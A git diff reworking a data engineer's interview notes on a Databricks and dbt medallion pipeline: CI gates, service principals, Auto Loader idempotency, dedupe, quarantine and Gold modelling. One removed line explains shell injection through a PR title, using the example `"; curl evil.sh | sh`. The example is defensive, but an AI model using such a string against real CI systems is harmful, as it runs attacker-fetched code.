@@ -1,197 +1,334 @@
 # Interview log
 
-One entry per ticket, written before you close it.
+Answers about the whole platform, organised by the questions a data engineering interviewer asks. It is not a diary of how it was built.
 
-## Ticket NN: title
+**How to read the numbers**
+- **Measured:** observed on Databricks, in Delta history, in SQL on the tables, in CI, or in a local Spark benchmark. See the evidence bank.
+- **Projected:** arithmetic from a measured number. Say "projected" out loud in the interview.
+- **Pending:** the measurement doesn't exist yet. Replace it when it does, and never quote a pending number.
 
-- **Decision:**
-- **Rejected alternative and why:**
-- **Impact (numbers where you can):**
-- **Hardest moment and how you got past it:**
+**How to maintain it:** after each ticket, add the new measurements to the evidence bank, replace the `Pending` markers they settle, and rewrite any answer the new work changes. Answers should stay holistic: the decision, the alternative, the impact, scale, and what you'd do differently.
 
-## Ticket 01: Repo skeleton and CI gates
+## Evidence bank
 
-- **Decision:** Every change to the pipeline has to pass 13 automated checks before it can merge, and they run before anything touches Databricks. They cover SQL style (sqlfluff), Python bugs and types, tests, leaked credentials and vulnerable dependencies. Each check is its own job, so a red check says exactly which rule broke. On a data team, a bad dbt model doesn't fail loudly: it writes wrong numbers into a Gold table that a dashboard reads. Catching it at the PR is the cheapest place to stop it.
-- **Rejected alternative and why:** I could have relied on code review alone and added checks later. Reviewers miss mechanical things like an inconsistently formatted model, an unpinned dependency or a pasted warehouse token, and the checks cost nothing to run on a public repo. I also rejected one big CI job: when a single job fails, you have to read the logs to find out why.
-- **Impact (numbers where you can):** The gates are 13 checks and 31 tests, with coverage at 93% (floor 90) and a mutation score of 90.5% (19 of 21 deliberate bugs caught, floor 85). The dependency audit found 0 known vulnerabilities across 132 locked packages. A planted fake API key was caught by gitleaks (1 leak found, PR blocked). The full suite runs in a few minutes on every PR.
-- **Hardest moment and how you got past it:** The SQL linter hung forever in CI. sqlfluff's dbt templater renders each model through dbt, and dbt-databricks opens a real warehouse connection to do it, so with placeholder credentials it waited indefinitely. A stack dump showed it stuck building dbt's relation cache. For now the lint passes because there are no models yet. Once models land, the lint job will need dev warehouse credentials. The other option is the plain Jinja templater, which needs no connection but renders macros less faithfully.
+| # | Fact | Value | Source |
+|---|---|---|---|
+| E1 | Source data | Olist: 99,441 Customer rows, 96,096 distinct `customer_unique_id` | generator test |
+| E2 | One daily Customer File Drop | 331 rows, 326 Customers, 2 bad ZIPs, 5 exact duplicates, 0 rescued values | SQL on Bronze |
+| E3 | Silver on that drop | 324 Customers. Removed 7 rows (2.1%); 2 Customers (0.6%) lost entirely because their only row was malformed | SQL on Bronze and Gold |
+| E4 | Gold key integrity | 324 rows, 324 distinct `customer_key`, `unique` and `not_null` tested on both keys | dbt tests |
+| E5 | Idempotency | 4 job runs on the same File Drop produced 1 Bronze write (`numOutputRows=331`); Bronze 331 and Gold 324 after every run | Delta `DESCRIBE HISTORY` |
+| E6 | Incremental vs full reload | 90 drops, 207,517 rows, Spark `local[2]`: full reload 5.3 to 9.5 s; one new day (5,602 rows) 1.9 s; rerun with nothing new 1.7 s, 0 rows | local benchmark |
+| E7 | End-to-end job | 91 to 101 s: generate 13 to 16 s, Bronze 10 to 23 s, dbt 57 to 58 s (about 60%) | Jobs API |
+| E8 | Storage density | 331 rows in 12,366 bytes of zstd Parquet, about 37 bytes per row | `DESCRIBE DETAIL` |
+| E9 | CI gates | 13 checks on every PR. Mutation score 87.4% (floor 85%); 0 known vulnerabilities in 132 locked packages; a planted fake key blocked by gitleaks | CI |
+| E10 | Least privilege | The staging deploy principal was denied creating a schema in `prod` and allowed in `staging` | CLI proof as the principal |
+| E11 | Reproducibility | The same seed produces byte-identical File Drops (`diff -r` on two runs) | generator test |
+| E12 | Credentials | 2 deploy principals, OAuth M2M secrets with 90-day expiry, prod behind 1 required reviewer | GitHub Environments |
+| E13 | Cost | $0: Databricks Free Edition, serverless only, public GitHub Actions minutes | billing |
 
-### Likely follow-up questions
+Pending: slim CI build counts and time, staging-to-prod lead time, rollback time, quarantine rate over time, SCD2 versions per Customer, `merge` vs `insert_overwrite` timings, partitioning vs liquid clustering pruning, the slow query before and after, PII masking proof.
 
-- **Why does a data engineer care about CI?** dbt models are code that produces data. A broken model in production means wrong numbers in reports, and a backfill to fix them. Linting and testing at the PR is much cheaper than a data incident.
-- **What's mutation testing?** The tool deliberately breaks the code, for example flipping `==` to `!=`, and checks whether a test fails. If no test fails, the tests aren't really checking that line. Coverage only says a line ran; mutation testing says a test would notice if it were wrong.
-- **Why pin actions and dependencies to exact versions?** Reproducibility. The same commit should build the same way next month. It's the same idea as pinning a dbt package version so a model's output doesn't change underneath you. Pinning GitHub Actions to a commit SHA also stops a compromised tag from running someone else's code with access to your secrets.
-- **Why pass the PR title through `env:`?** Anyone who opens a PR controls its title. Pasted straight into a shell command, a title like `"; curl evil.sh | sh` would run. As an environment variable it is only ever treated as text.
-- **Why a lock file (`uv.lock`) and `--locked`?** The lock file records every package version. `--locked` fails CI if the lock file is out of date, so the versions audited are the versions that actually run.
-- **What would you improve?** gitleaks-action only scans the commits the PR's commits API lists, so running the gitleaks binary over the full commit range would close that gap. Bundle validation waits for the Databricks workspace in ticket 02.
+## The pitch
 
-## Ticket 02: Free Edition proof (catalogs, service principals, CI deploy)
+**30 seconds:** "I built a customer analytics platform on Databricks that runs like a production system. Daily file drops of real Brazilian e-commerce data, with injected duplicates, malformed rows, schema drift and address changes, land in a Bronze Delta layer through Auto Loader. dbt cleans, deduplicates and quarantines them into Silver, and builds a Kimball star in Gold with an SCD Type 2 Customer dimension. Everything is code: a Databricks Asset Bundle defines the jobs, schemas and grants, and GitHub Actions tests every PR, deploys to staging and promotes the same commit to prod after approval. Nobody touches the Databricks UI."
 
-- **Decision:** Every deploy to staging and prod runs from GitHub Actions as a per-environment service principal using OAuth machine-to-machine credentials, defined as a Databricks Asset Bundle. Merging to `main` deploys to staging; prod waits for my approval in a protected GitHub Environment and deploys the same commit. Each principal only has write grants on its own catalog, so a staging credential cannot touch prod data even if it leaks.
-- **Rejected alternative and why:** A personal access token in a repo secret, deployed with my own identity. It is quicker to set up, but every deploy would run as me with all my permissions, it would break if my account went away, and there is no per-environment separation. I also rejected one shared principal for both environments: one leaked secret would expose prod.
-- **Impact (numbers where you can):** 3 catalogs, 2 deploy principals, 2 GitHub Environments with 3 secrets each, and 1 required reviewer. Secrets expire after 90 days and rotate with zero downtime (up to 5 active secrets per principal). The bootstrap doc reduces the manual setup to a fixed list of one-time steps; everything else is code.
-- **Hardest moment and how you got past it:** The hello job passed every test locally but failed on Databricks with `SystemExit: 0`. Serverless runs Python tasks inside an IPython session, where `sys.exit()` raises an exception even with a success code, so Databricks marked a successful run as failed. The fix was to call `sys.exit` only for non-zero codes. Before that, the first run failed with a one-off 403 from Databricks' storage layer; checking the file through the API showed it had uploaded correctly, and a re-run passed that step.
+**2 minutes, add:** "Three properties I designed for. First, every rerun is safe: four runs on the same file wrote Bronze exactly once. Second, nothing is silently lost: Bronze keeps every raw row, and failed rows go to quarantine with a reason and a replay path. I found that dropping bad rows cost 0.6% of Customers with no trace. Third, change is cheap and safe: 13 CI gates including mutation testing at 87.4%, per-developer and per-PR schemas, staging before prod, and a tested rollback. Incremental loading was 3 to 5 times faster than full reloads at 91 days of history, and the gap grows every day, which is what matters at terabyte scale."
 
-### Likely follow-up questions
+## Architecture
 
-- **What is a service principal?** A non-human identity for automation. It has its own permissions and credentials, so deploys don't depend on a person's account, and access can be limited to exactly what the pipeline needs.
-- **Why OAuth secrets over a personal token?** They belong to the principal not a person, they expire, they can be rotated without downtime, and their access is limited by Unity Catalog grants.
-- **How is prod protected?** Three layers: prod only runs after staging succeeds (`needs: staging`), it waits for a required reviewer in the `prod` GitHub Environment, and only that job can read the prod secrets.
-- **Development vs production bundle mode?** Development mode prefixes resources with your name, pauses schedules and deploys into your home folder, so experiments don't collide. Production mode deploys unprefixed resources to a shared path and expects a stable identity via `run_as`.
-- **Why pin `databricks/setup-cli` to a SHA?** A tag can be moved to different code; a SHA cannot. The deploy job holds prod credentials, so it must only run code I've reviewed. Renovate (ticket 17) proposes updates as PRs.
-- **What would you improve?** Restrict the shared bundle folder so only the deploy principals can write to it, and add a scheduled check that each principal can still log in, so an expired secret is caught before release day.
-
-## Ticket 03: Chaos generator for Customer File Drops
-
-- **Decision:** A seeded Python generator replays Olist Customers as one full CSV snapshot per day, written to `customers/ingest_date=YYYY-MM-DD/customers.csv`. A Customer first appears on the day of their first Order. Duplicates, malformed rows and address changes are injected at rates passed on the command line. The Olist files are downloaded at runtime from a GitHub mirror pinned to one commit, then cached locally.
-- **Rejected alternative and why:** Committing the Olist CSVs, or a hand-made sample. Committing adds about 25 MB of third-party data (customers plus orders) to every clone, and a small hand-made sample has none of the real mess (repeat Customers, 99,441 rows). An unseeded generator was rejected too: every run would give different data, so a failing Silver test could never be reproduced.
-- **Impact (numbers where you can):** 3 fault types (`missing_id`, `bad_zip`, `bad_date`) plus duplicates and address changes, each with its own test and rate. The same seed gives byte-identical files, so every later ticket tests against exactly the same mess. 99,441 Olist Customer rows collapse to 96,096, one per `customer_unique_id`. 3 real days from 2017-01-01 gave 331, 329 and 327 rows.
-- **Hardest moment and how you got past it:** Making a stateful random process repeatable. Address changes depend on yesterday's state, so the generator walks Customers in sorted ID order and draws every random number from one `random.Random(seed)`, in a fixed order. Any loop over an unordered set would have broken byte identity. Mutation testing then showed tests that ran lines without checking them (for example, that a moved Customer gets a real address), and fixing those raised the score from 78.9% to 87.4%.
-
-### Likely follow-up questions
-
-- **Why full snapshots, not changes only?** Many source systems can only export the whole table. It forces Bronze to keep every file and Silver to work out what changed, which is the realistic, harder case.
-- **Why does the chaos have to be repeatable?** A data test that fails must fail the same way on the next run, or you can't tell a fix from luck. A seed turns random data into a fixed fixture.
-- **Why pin the download to a commit?** A branch can change under you; a commit cannot. Same idea as pinning actions to a SHA.
-- **What would you improve?** Validate that rates are between 0 and 1 and that `--days` is positive, add schema drift (a new or renamed column on some day), and checksum the downloaded files.
-
-## Ticket 04: Customer tracer slice, Bronze to dim_customer in dev
-
-Answers are written to be said out loud. "Measured" numbers come from the Databricks job, Delta history, SQL on the tables, or a local Spark benchmark. "Projected" numbers are arithmetic from those measurements and are labelled as such.
-
-### Reference sheet (the facts every answer draws on)
-
-| Fact | Value | Source |
-|---|---|---|
-| File Drop | `/Volumes/dev/dbt_thomasjwrightmain_landing/files/customers/ingest_date=2017-01-01/customers_2017-01-01.csv` | job run |
-| Bronze table | `dev.dbt_thomasjwrightmain_bronze.customers`, partitioned by `_file_drop_date` | `DESCRIBE DETAIL`: `partitionColumns: ["_file_drop_date"]` |
-| Checkpoint | `.../files/_checkpoints/bronze_customers/` with `offsets/0`, `commits/`, `sources/0/rocksdb` | `databricks fs ls` |
-| Raw rows | 331 rows, 326 distinct Customers, 0 empty IDs, 2 bad ZIPs, 0 bad dates, 0 rescued | SQL on Bronze |
-| Silver result | 329 valid rows, 324 Customers: 2 bad-ZIP rows and 5 duplicate copies removed | SQL on Bronze |
-| Gold result | 324 rows, 324 distinct `customer_key` | SQL on Gold |
-| Idempotency | 4 job runs on the same drop, 1 Bronze write (`STREAMING UPDATE`, `numOutputRows=331`) | `DESCRIBE HISTORY` |
-| Job runtime | run 708828557475645: 91 s (generate 16, Bronze 10, dbt 58); run 878137252751773: 101 s (13, 23, 57) | Jobs API |
-| Benchmark | 90 drops, 207,517 rows, Spark `local[2]`: full reload 5.3 to 9.5 s, new day 1.9 s, no-op rerun 1.7 s | local benchmark |
-| Tests | 7 Spark Bronze tests, 7 bundle and manifest tests, 3 dbt unit tests, 8 dbt data tests, mutation score 87.4% (floor 85%) | pytest, dbt, mutmut |
-
-### "Walk me through what you built."
-
-"It's the first vertical slice of a medallion pipeline on Databricks, from a raw CSV to a Gold dimension, deployed entirely from Git with a Databricks Asset Bundle. `databricks bundle deploy -t dev` creates two Unity Catalog schemas, a managed volume and a three-task job, all from `resources/customer_tracer_job.yml`.
-
-Task one, `generate_customer_drop`, writes one day of Olist Customers into the landing volume, at `customers/ingest_date=2017-01-01/customers_2017-01-01.csv`. The generator injects realistic faults: exact duplicate rows, and malformed rows with an empty ID, a ZIP of `not-a-zip`, or a date of `not-a-date`.
-
-Task two, `bronze_customers`, is a PySpark Auto Loader stream:
-
-```python
-spark.readStream.format("cloudFiles")
-    .option("cloudFiles.format", "csv")
-    .option("cloudFiles.schemaLocation", ".../_schemas/bronze_customers")
-    .option("cloudFiles.schemaEvolutionMode", "rescue")
-    .load(".../files/customers")
-# + _ingested_at = current_timestamp(), _source_file = _metadata.file_path,
-#   _file_drop_date = the date parsed out of ingest_date=YYYY-MM-DD in the path
-    .writeStream.option("checkpointLocation", ".../_checkpoints/bronze_customers")
-    .partitionBy("_file_drop_date")
-    .trigger(availableNow=True)
-    .toTable("dev.dbt_thomasjwrightmain_bronze.customers")
+```mermaid
+flowchart LR
+    G[Chaos generator<br/>daily File Drops] --> V[(landing volume)]
+    V -->|Auto Loader, availableNow<br/>checkpoint per table| B[(Bronze<br/>raw rows + metadata)]
+    B -->|dbt incremental merge<br/>validate, dedupe| S[(Silver)]
+    B -->|failed rules| Q[(Quarantine<br/>reason, payload, status)]
+    Q -->|replay / release| S
+    S -->|dbt| D[(Gold<br/>dims + facts + marts)]
+    D --> A[Analysts, BI]
+    J[Databricks Job<br/>from Asset Bundle] -.orchestrates.-> G & B & S & D
+    O[(ops: audit rows,<br/>dbt run results)] -.-> M[Alerts, dashboard]
 ```
 
-Task three runs `dbt build --target dev`. `stg_customers` trims, pads ZIPs to 5 digits, lower-cases city, upper-cases state, parses dates with `try_to_date`, drops rows it can't trust, and deduplicates with `qualify row_number()`. `dim_customer` is a Type 1 dimension keyed on `md5(customer_unique_id)`.
+| Layer | Holds | Load pattern | Owned by |
+|---|---|---|---|
+| Landing | Raw File Drops: Customers as full CSV snapshots, Orders, Order Items and Payments as incremental JSON | Append-only files | Generator |
+| Bronze | Every row as received, all strings, plus `_source_file`, `_ingested_at`, `_file_drop_date`, `_rescued_data` | Auto Loader, `availableNow`, append | PySpark job task |
+| Silver | Typed, standardised, one row per natural key; `quarantine` for rows that fail rules | dbt incremental `merge`, 3-day lookback | dbt |
+| Gold | Kimball star: `dim_customer` (SCD2), `dim_product`, `dim_seller`, `dim_date`, `fct_order_items`, `fct_payments`, `fct_orders`, `customer_rfm` | dbt; facts merged on grain key | dbt |
+| Ops | One audit row per task run, dbt `run_results` | Append | Job tasks |
 
-On the first real drop, 331 raw rows became 324 Customers, and four runs on the same drop wrote Bronze exactly once."
+Environments are Unity Catalog catalogs `dev`, `staging` and `prod`. Developers get `dev.dbt_<user>_*` schemas, PRs get `dev.ci_pr_<n>_*`, and staging and prod use plain `bronze`, `silver`, `gold`.
 
-### "Why did you design it this way?"
+## Design questions
 
-**Why `availableNow` streaming instead of `spark.read`?**
-"The checkpoint. A batch read has no memory, so every run rereads every file ever dropped, and a rerun appends the same rows again. Auto Loader records each file it has committed, in RocksDB under `sources/0` in the checkpoint. `availableNow` runs that like a batch job: it processes every unseen file, then stops, so the compute bill is per run, not 24/7.
+### Why a medallion architecture?
 
-I measured it locally on 90 daily drops, 207,517 rows. A full batch reload took 5.3 to 9.5 seconds. The incremental load of one new day, 5,602 rows, took 1.9 seconds, so 2.9 to 5 times faster. A rerun with nothing new took 1.7 seconds and wrote 0 rows; that 1.7 seconds is fixed stream start-up and checkpoint reading, not data work. On Databricks, four runs on the same drop produced exactly one `STREAMING UPDATE` in Delta history. The ratio isn't fixed: full-reload cost is proportional to total history, and incremental cost to one day, so at 365 days the gap is roughly 365 to 1 in data read (projected)."
+**Answer:** "Each layer has one job, so each failure has one place to look. Bronze is the system of record: every row exactly as it arrived, with where and when it came from. That means I can rebuild Silver and Gold from Bronze at any time without asking the source to resend anything. Silver is where business rules live: types, standardisation, dedupe and quarantine. Gold is the contract with analysts: modelled, tested, stable column names."
 
-**Why does Bronze keep strings, and use `rescue` mode?**
-"Bronze's job is to never lose or reject data. All 5 columns are strings, so `not-a-date` loads as text instead of failing the whole file. If the source adds a column or sends a value that doesn't fit, `rescue` mode puts it in `_rescued_data` instead of failing the stream. On this drop, `_rescued_data` was null for all 331 rows, and I checked that with SQL rather than assuming it. Typing happens in Silver with `try_cast` and `try_to_date`, which return null instead of throwing, so one bad value costs one row, not the run."
+**Impact:** "On one daily drop, Bronze kept all 331 rows, including 5 duplicates and 2 malformed rows (E2). Because Bronze kept them, I could measure what Silver removed and prove that 2 Customers went missing (E3). Without a raw layer, that loss would be invisible."
 
-**Why those three metadata columns?**
-"Each one answers a question I'd otherwise have no way to answer. `_source_file` says which file a row came from, for debugging and for the dedupe tie-breaker. `_ingested_at` says when it was loaded, for ordering two versions with the same `updated_at`. `_file_drop_date` says which day's drop it belongs to; it's the partition column, so a query or replay for one day reads one directory."
+**How I'd do it differently:**
+- **Fewer layers:** a small team with clean sources could go straight from raw to modelled views. That's fewer tables to maintain, but there's no replay without the source.
+- **Lakeflow Declarative Pipelines:** these manage the layers, dependencies and quality expectations for you. That's a good choice for a team that wants less code. I chose a plain job plus dbt so every mechanism (checkpoints, merges, quarantine) is visible and testable.
 
-**Why that dedupe order?**
-"`row_number() over (partition by customer_unique_id order by updated_at desc, _ingested_at desc, _source_file desc)`. `updated_at` alone isn't enough. My unit test has Customer `u2` twice with `updated_at = 2017-01-02`: ZIP `40010` loaded at `2017-01-02 06:00` from `a.csv`, and ZIP `40020` loaded at `2017-01-03 06:00` from `b.csv`. Spark's `row_number()` on a tie is non-deterministic, so without the tie-breakers, Gold could flip between `40010` and `40020` from one run to the next. With them, the later load wins every time, and the test asserts `40020`."
+**Follow-ups:**
+- *"Isn't keeping every raw row expensive?"* "At 37 bytes a row compressed (E8), a year of 2.7 GB days is about 1 TB, which costs tens of dollars a month in object storage at list prices. A rebuild that requires the source to resend data costs far more."
+- *"When would you not keep raw data?"* "When it contains data you're not allowed to retain, like card numbers. Then you mask or tokenise at ingestion and document it."
 
-**Why `md5(customer_unique_id)` as the surrogate key?**
-"It's deterministic: rebuilding the table gives every Customer the same key, so facts never need re-pointing. A sequence or `monotonically_increasing_id()` changes on every rebuild. Gold has 324 rows and 324 distinct keys, enforced by `unique` and `not_null` tests on both `customer_key` and `customer_unique_id`."
+### Why dbt for Silver and Gold, rather than PySpark?
 
-**Why per-developer schemas?**
-"Two engineers running `dbt build` into a shared `dev.silver` overwrite each other's `stg_customers` mid-test. Every developer gets `dev.dbt_<username>_landing`, `_bronze`, `_silver` and `_gold`, and staging and prod get plain `bronze`, `silver`, `gold`. A single `generate_schema_name` macro decides: in the `dev` target it returns `<target.schema>_<custom_schema>`, otherwise just `<custom_schema>`. A test runs `dbt parse` and asserts the schema of every model in the manifest for each target."
+**Answer:** "I split by what each tool is best at. PySpark owns ingestion, because file discovery, streaming checkpoints and schema rescue are Spark APIs with no SQL equivalent. dbt owns transformations, for five reasons:
+1. **Dependencies are declared, not coded.** `ref('stg_customers')` builds the DAG, so models run in the right order and lineage comes for free.
+2. **Testing is built in.** Unit tests on fixed rows prove the tricky logic, like the dedupe tie-break, and data tests (`unique`, `not_null`, `relationships`) run on every build.
+3. **Environments in one place.** One `generate_schema_name` macro routes every model to `dbt_<user>_silver` in dev and `silver` in prod. In PySpark I'd thread environment names through every job.
+4. **Slim CI.** `dbt build --select state:modified+ --defer` builds only the models a PR changed and their children, against prod's manifest.
+5. **SQL is the shared language.** Analysts can read, review and contribute to SQL models, which widens who can safely change the logic."
 
-### "Tell me about a difficult problem. How did you solve it, and what was the outcome?"
+**Impact:** "The whole Customer cleaning, validation and dedupe is 37 lines of SQL with 3 unit tests that run without touching real data. dbt was 57 seconds of a 91-second run (E7), and on 331 rows that's almost all fixed overhead: connection, compile, and 11 test queries. Pending: slim CI models built per PR versus the full project, and CI minutes saved."
 
-"Getting the same YAML to produce correct, isolated names in dev and clean names in prod.
+**How I'd do it differently:**
+- **All PySpark with Delta `MERGE`:** better when transformations need Python, like ML features, complex parsing or calling an API. The cost is that testing, lineage and environment routing are code you write and maintain.
+- **SQLMesh instead of dbt:** virtual environments make dev and CI builds nearly free, and it understands column-level changes. dbt has the bigger ecosystem and hiring pool, which is why I picked it.
+- **Lakeflow Declarative Pipelines with expectations:** quality rules are declarative and managed, but Free Edition allows one active pipeline per type, and I wanted the mechanics visible.
 
-**Situation.** After my first `bundle deploy -t dev`, the job was `dbt_thomasjwrightmain_customer_tracer`, but the schemas were `dbt_thomasjwrightmainbronze`, with no underscore. dbt computes `dbt_thomasjwrightmain_silver` from its profile and reads Bronze from `dbt_thomasjwrightmain_bronze`, so every dbt run would fail with `TABLE_OR_VIEW_NOT_FOUND`.
+**Follow-ups:**
+- *"Where does dbt hurt?"* "Complex procedural logic, and anything stateful across runs that isn't a merge. Jinja can become unreadable. I keep macros small and tested."
+- *"How does dbt run on Databricks here?"* "As a dbt task in the job, on the serverless SQL warehouse, using the repo's `profiles.yml`. I found that the task silently ignores your profile if you also set `warehouse_id`, so the task doesn't set it."
+- *"What does `--defer` do?"* "Unchanged upstream models resolve to prod's tables instead of being rebuilt, so a PR that changes one Gold model builds one model, not the whole DAG."
 
-**Action.** Rather than deploy-and-guess, I tested each hypothesis with `databricks bundle validate -t dev -o json`, which resolves every final name without touching the workspace, against throwaway copies of the repo. Five experiments gave four facts:
-1. Development mode prefixes Unity Catalog schemas, and that can't be turned off.
-2. For schemas it strips the trailing `_` from `name_prefix` and then concatenates; for jobs it keeps the `_`.
-3. `name_prefix: ""` doesn't disable it; it falls back to `dev_<user>_`, which would give `dev.dev_thomasjwrightmain_bronze`.
-4. A custom prefix like `dbt_tom_` is rejected: `prefix should contain the current username or ${workspace.current_user.short_name} to ensure uniqueness when using 'mode: development'`.
+### How do you ingest files? Why Auto Loader?
 
-So the prefix has to contain the username, and the separator has to come from somewhere else. I added one bundle variable:
+**Answer:** "Auto Loader with `trigger(availableNow=True)` in a scheduled job. It discovers new files, records each file it has committed in a checkpoint, and stops when there's nothing left. So it behaves like a batch job with exactly-once file tracking. Each table has its own checkpoint and schema location, outside the folder it watches."
 
-```yaml
-variables:
-  schema_separator: { default: "" }      # staging, prod: name: landing
-targets:
-  dev:
-    presets: { name_prefix: dbt_${workspace.current_user.short_name}_ }
-    variables: { schema_separator: _ }    # dev: dbt_thomasjwrightmain + _landing
-resources:
-  schemas:
-    landing: { name: ${var.schema_separator}landing }
-```
+**Impact:** "Measured on 90 days of drops (E6): one new day loaded in 1.9 s against 5.3 to 9.5 s for a full reload, 2.9 to 5 times faster. A rerun with nothing new took 1.7 s and wrote 0 rows. Full-reload cost grows with total history, while incremental cost grows with one day, so the ratio keeps widening. Compute: a 95-second daily run instead of an always-on stream is about 900 times less compute time per day (projected: 86,400 / 95)."
 
-**Second problem, same week.** The dbt task then failed with `The profile 'analytics_platform' does not have a target named 'dev'. The valid target names for this profile are: - databricks_cluster`. The task had both `warehouse_id` and `profiles_directory`. The dbt task reference says `profiles_directory` can only be set when no `warehouse_id` is set; with a warehouse ID, Databricks generates its own `profiles.yml` with one `databricks_cluster` target and ignores mine. I removed `warehouse_id`, since my profile already points at the warehouse through `http_path`, and added a test asserting `"warehouse_id" not in dbt_task`.
+**How I'd do it differently:**
+- **`COPY INTO`:** also idempotent per file, and pure SQL, so it could live in dbt. It's simpler, but you get less control over schema evolution and rescue, and it doesn't scale as well to millions of files.
+- **Continuous streaming** (`processingTime="1 minute"`): when consumers need minutes of freshness, not daily. It's a one-line change, but the cluster runs 24/7.
+- **Event-driven ingestion:** trigger the job on file arrival instead of a schedule, so latency drops from up to a day to minutes, while still using `availableNow`.
 
-**Outcome.** Dev resolves to `dbt_thomasjwrightmain_landing` and `_bronze` and prod to `landing` and `bronze`, from identical resource YAML. One `profiles.yml` now serves local runs, CI and the job. The job ran green end to end in 91 seconds, with zero manual UI steps. Both behaviours are pinned by tests, so a CLI upgrade that changes them fails in CI, not in a deploy."
+**Follow-ups:**
+- *"What if the checkpoint is deleted?"* "Auto Loader reloads every file and Bronze doubles. Silver's dedupe still produces correct Customers, which is why dedupe sits downstream of an append-only Bronze. Then I'd rebuild Bronze from the files."
+- *"Why not infer column types?"* "A value that doesn't fit the inferred type moves to `_rescued_data`, splitting one column's data across two places. Bronze reads strings, and Silver casts with `try_cast`."
+- *"What if a source resends a corrected file under a new name?"* "Both load, because Auto Loader tracks paths, not content. Silver's dedupe picks the correction deterministically."
+
+### Batch or incremental? How do you choose?
+
+**Answer:** "It's per layer and per entity. Customers arrive as full daily snapshots, so Bronze appends them incrementally by file, and Silver works out what changed. Orders, Order Items and Payments arrive as incremental JSON. Silver is an incremental `merge` on the natural key with a 3-day lookback, so late rows are caught without a rebuild. A weekly full refresh in staging is compared with the incremental result, to prove that incremental is correct, not just fast."
+
+**Impact:** Measured: incremental Bronze was 2.9 to 5 times faster at 91 files (E6). Pending: Silver `merge` time vs full rebuild, and the weekly full-refresh diff, which should be 0 rows.
+
+**How I'd do it differently:** "Full rebuilds are the right call for small tables, under a few GB, where simplicity beats speed. Change data feed or CDC from the source, instead of snapshots, would let Silver read only the changed rows, without computing the diff itself."
+
+**Follow-ups:**
+- *"Why a 3-day lookback?"* "It's a trade-off: wider catches later data but reprocesses more. I'd set it from the measured lateness distribution, the 99.9th percentile of `_ingested_at` minus the event date."
+- *"How do you prove incremental equals full?"* "Build both and run an `except all` in both directions; the result must be 0 rows."
+
+### How do you make the pipeline idempotent?
+
+**Answer:** "At every layer, because one weak link breaks it:
+1. **File names** are deterministic, derived from the business date, so a regenerated drop has the same path.
+2. **Bronze** commits each file once through the Auto Loader checkpoint.
+3. **Silver** dedupes with a total order: latest `updated_at`, then latest `_ingested_at`, then greatest `_source_file`. Ties are broken the same way every run.
+4. **Gold keys** are hashes of natural keys, so a rebuild gives every row the same key.
+5. **Facts** merge on their grain key, so a retry updates rows instead of duplicating them."
+
+**Impact:** "Four runs on the same file produced one Bronze write, 331 rows (E5). Bronze stayed at 331 and Gold at 324 after every run."
+
+**How I'd do it differently:** "Write-audit-publish: build into a staging branch of the table, run checks, then publish atomically. It's stronger, because a half-finished run is never visible, but it costs an extra copy and more orchestration."
+
+**Follow-ups:**
+- *"Give me a case where it would have broken."* "I briefly named files with a wall-clock timestamp, to look like real exports. A regenerated day then had a new path, so Auto Loader would load it again and Bronze would go from 331 to 662 rows with nothing failing. A rerun test made me trace it."
+- *"Why not `monotonically_increasing_id()` for keys?"* "It changes on every rebuild, so every fact pointing at a dimension would need re-pointing."
+
+### How do you handle bad data?
+
+**Answer:** "Nothing is silently dropped. Bronze keeps everything. Silver checks rules (required keys, parseable dates and ZIPs) and sends each failing row to a quarantine table with a reason code, the original payload and a status: `open`, `released` or `superseded`. Open rows are rechecked on every run, so a rule fix releases them automatically, and a correction in a later file supersedes them. A `replay` job parameter reprocesses a date range from Bronze. If the quarantine rate passes a threshold, the job fails before Gold is published."
+
+**Impact:** "Measured: when Silver simply dropped bad rows, 2 of 326 Customers (0.6%) disappeared from Gold with no trace except a count difference (E3). Quarantine turns that into a visible, alertable metric. Pending: quarantine rate per run, and rows released after a rule fix."
+
+**How I'd do it differently:**
+- **Fail the whole file:** right for financial data, where a partial load is worse than a late one.
+- **Keep bad rows in Silver with a quality flag:** simpler, but every consumer has to remember to filter them.
+- **Great Expectations, or Lakeflow expectations:** managed rule libraries instead of hand-written SQL, worth it once there are hundreds of rules.
+
+**Follow-ups:**
+- *"How do you pick the threshold?"* "From the measured baseline: alert at several times the normal rate, and tune it from false alarms."
+- *"How do you handle bad data that passes every rule?"* "Tests on distributions and relationships (for example, every Order has a known Customer), plus freshness and volume alerts. A drop that's 50% smaller than yesterday is a signal, even if every row is valid."
+
+### How do you deduplicate?
+
+**Answer:** "`row_number() over (partition by customer_unique_id order by updated_at desc, _ingested_at desc, _source_file desc)`, keeping row 1 with `qualify`. `updated_at` alone isn't enough: when two versions share it, Spark's `row_number()` picks a winner non-deterministically, so Gold could flip between values from run to run. The ingest timestamp and file name break ties the same way every time. A dbt unit test feeds two versions with the same `updated_at` and asserts that the later load wins."
+
+**Impact:** "5 duplicate rows in 331 collapsed to one row per Customer (E2, E4), with zero key violations."
+
+**How I'd do it differently:** "Dedupe at ingestion with `dropDuplicates` plus a watermark in a stream. That's cheaper downstream, but it destroys the raw record. Or dedupe on a content hash, which is good when sources resend identical rows with new timestamps."
+
+**At scale:** "The window function shuffles every row by key. On billions of rows I'd only dedupe the incremental slice, then `merge`, and check the Spark UI for skew: one key with millions of versions lands on one task."
+
+### How do you handle schema drift?
+
+**Answer:** "In two places. Auto Loader's rescue mode keeps unexpected values in `_rescued_data` instead of failing the stream. Then a data contract per source, in YAML, classifies each change. Additive changes, like a new column, pass and are logged. Breaking changes, like a dropped or retyped column, quarantine the whole File Drop and raise an alert, because loading half-understood data is worse than loading it late."
+
+**Impact:** "Measured: 0 rescued values on the Customer drop (E2), checked, not assumed. Pending: the drift-injection results (columns added and renamed, drops quarantined)."
+
+**How I'd do it differently:** "Use `addNewColumns`, which evolves the table automatically: fast, but a renamed column silently becomes a new column full of nulls. Or use a schema registry with producer-side contracts, the right answer when you control the producers."
+
+**Follow-ups:** *"Who approves a breaking change?"* "The consumer. The contract change ships as a PR, and Gold's enforced model contracts fail CI if a column the analysts rely on would change."
+
+### How did you model Gold?
+
+**Answer:** "A Kimball star, because analysts ask questions in business terms (orders by customer region by month), and a star answers them with simple joins. Every fact has a declared grain: `fct_order_items` is one row per order and item number, `fct_payments` one row per order and payment sequence. `fct_orders` is an accumulating snapshot, one row per order, updated as it's approved, shipped and delivered, so lead times are just column differences. Dimensions are `dim_customer` (SCD2), `dim_product` and `dim_seller` (Type 1), and a generated `dim_date`."
+
